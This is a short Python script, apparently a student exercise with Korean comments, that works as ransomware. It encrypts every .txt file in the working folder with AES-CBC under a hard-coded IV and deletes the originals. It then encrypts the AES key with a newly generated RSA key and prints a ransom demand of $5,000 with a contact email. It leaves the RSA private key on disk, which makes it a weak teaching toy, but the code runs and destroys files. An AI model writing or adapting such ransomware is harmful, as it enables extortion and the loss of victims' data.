from Crypto.Random import get_random_bytes
from base64 import b64encode
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
import glob
import os

# AES_CBC 암호화 위한 128bits 대칭키 생성 , 인코딩
s_key = get_random_bytes(16)  # 128bit 대칭키 생성
key_enc = b64encode(s_key).decode('utf-8')  # key based64 encoding

# STEP2 txt 파일을 s_key 로 암호화, enc 파일에 저장한 코드
files = glob.glob('*.txt')  # txt 를 모두 다 가져옴
for file in files:
    iv = b'.m\xc5\x9c\xfd\xe9""\xe0e\xa6Do\x95A\xe9'    # 하드 코딩 된 iv 값
    cipher = AES.new(s_key, AES.MODE_CBC,iv)  # CBC모드로 AES 객체를 생성한다.
    file_name_without_txt = file[0:-4]  # .txt 를 제외한 파일 명
    enc_filepath = os.path.join(file_name_without_txt+".enc")   # 원래 파일명에 확장자로 .enc 를 붙여주고 파일을 생성했다
    fid = open(enc_filepath, "w")
    with open(file, 'r') as f:
        data = f.read()  # 문자열을 읽어와서
        data_b = bytes(data, 'utf-8')   # 바이트로 변환한다.
        ct_bytes = cipher.encrypt(pad(data_b, AES.block_size))  # pad를 붙여주고 해당 데이터를 암호화한다.
        ct_enc = b64encode(ct_bytes).decode('utf-8')  # 암호화된 바이트 데이터를 base64로 인코딩해준다.
        if os.path.isfile(enc_filepath):
            fid.write(ct_enc)   # 파일이 있는 경우 암호문을 .enc 파일에 복사한다.
        os.remove(file)   # 원본 파일인 .txt 파일을 삭제한다.
    fid.close()

# STEP3 대칭 키를 RSA를 사용해서 암호화하고 key.bin에 저장
key = RSA.generate(2048)    # RSA 공개키, 비밀키 생성
private_key = key.export_key()  # 개인키
file_out = open("private.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = key.publickey().export_key()   # 공개키
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

# 대칭 키 RSA 암호화
recipient_key = RSA.import_key(open("receiver.pem").read())
file_out = open("key.bin", "wb")
cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_data = cipher_rsa.encrypt(key_enc.encode('utf-8'))
file_out.write(enc_data)
file_out.close()

print("Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send key.bin in your folder to songah119@ewhain.net")